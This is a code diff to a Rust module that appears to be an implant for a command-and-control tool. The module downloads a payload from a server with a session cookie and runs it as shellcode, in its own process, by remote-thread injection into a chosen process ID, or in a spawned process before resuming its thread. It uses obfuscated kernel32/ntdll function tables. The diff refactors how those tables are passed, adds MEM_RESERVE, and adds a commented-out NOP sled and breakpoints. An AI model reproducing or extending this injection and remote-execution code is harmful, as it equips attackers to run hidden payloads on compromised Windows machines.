@@ -25,9 +25,12 @@ pub mod command {
             .headers(headers.clone())
             .send()
             .unwrap();
-
-        let file_vec: Vec<u8> = file_response.bytes().unwrap().into();
-        return file_vec;
+        // let nopsled: Vec<u8> = vec![0x90, 0x90,  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90];
+        let raw_file: Vec<u8> = file_response.bytes().unwrap().into();
+        // let mut file_vec: Vec<u8> = Vec::new();
+        // file_vec.extend_from_slice(&nopsled);
+        // file_vec.extend_from_slice(&raw_file);
+        return raw_file;
     }
 
     pub fn shell(shell_str: &str) -> String {
@@ -47,6 +50,8 @@ pub mod command {
         cookie_header: &reqwest::header::HeaderValue,
         file_name: &str,
         memory_permissions: &str,
+        kernel32: &obf_kernel32,
+        ntdll: &obf_ntdll
     ) -> String {
         // Get the file off the server
         let file_vec = get_file_vec(base_url, file_name, cookie_header);
@@ -57,8 +62,6 @@ pub mod command {
         let mut old_perms = PAGE_READWRITE;
 
         unsafe {
-            let kernel32 = &*OBF_KERNEL32;
-            let ntdll = &*OBF_NTDLL;
 
             // If specified to use RW memory, allocate, copy, change to RX, execute
             if memory_permissions == "RW" {
@@ -99,6 +102,8 @@ pub mod command {
         file_name: &str,
         target_pid: u32,
         memory_permissions: &str,
+        kernel32: &obf_kernel32,
+        ntdll: &obf_ntdll
     ) -> String {
         // Get the file off the server
         let file_vec = get_file_vec(base_url, file_name, cookie_header);
@@ -107,9 +112,7 @@ pub mod command {
         let file_size = file_bytes.len();
 
         unsafe {
-            // Get the kernel32 library
-            let kernel32 = &*OBF_KERNEL32;
-
+            
             // Get a handle on the target process
             let handle = (kernel32.OpenProcess)(
                 PROCESS_CREATE_THREAD
@@ -130,7 +133,7 @@ pub mod command {
                     handle,
                     null(),
                     file_size,
-                    MEM_COMMIT,
+                    MEM_COMMIT | MEM_RESERVE,
                     PAGE_READWRITE,
                 );
                 // Write memory inside of targed pid
@@ -157,7 +160,7 @@ pub mod command {
                     handle,
                     null(),
                     file_size,
-                    MEM_COMMIT,
+                    MEM_COMMIT | MEM_RESERVE,
                     PAGE_EXECUTE_READWRITE,
                 );
                 // Write memory inside of targed pid
@@ -169,6 +172,7 @@ pub mod command {
                     null_mut(),
                 );
                 // Spawn the thread
+                 //std::arch::asm!("int3");
                 (kernel32.CreateRemoteThread)(handle, null(), 0, dest, null(), 0, null_mut());
             }
 
@@ -182,6 +186,8 @@ pub mod command {
         cookie_header: &reqwest::header::HeaderValue,
         file_name: &str,
         memory_permissions: &str,
+        kernel32: &obf_kernel32,
+        ntdll: &obf_ntdll
     ) -> String {
         // Get the file off the server
         let file_vec = get_file_vec(base_url, file_name, cookie_header);
@@ -191,8 +197,6 @@ pub mod command {
 
         unsafe {
    
-            let kernel32 = &*OBF_KERNEL32;
-
             let mut old_perm = PAGE_READWRITE;
 
             // Fingers crossed custom STARTUPINFOA works
@@ -212,7 +216,7 @@ pub mod command {
                     pi.hProcess,
                     null(),
                     file_size,
-                    MEM_COMMIT,
+                    MEM_COMMIT | MEM_RESERVE,
                     PAGE_READWRITE,
                 );
                 _ = (kernel32.WriteProcessMemory)(
@@ -240,7 +244,7 @@ pub mod command {
                     pi.hProcess,
                     null(),
                     file_size,
-                    MEM_COMMIT,
+                    MEM_COMMIT | MEM_RESERVE,
                     PAGE_EXECUTE_READWRITE,
                 );
                 _ = (kernel32.WriteProcessMemory)(
@@ -255,6 +259,7 @@ pub mod command {
                     pi.hThread,
                     null()
                 );
+                //std::arch::asm!("int3");
                 _ = (kernel32.ResumeThread)(pi.hThread);
             }
 
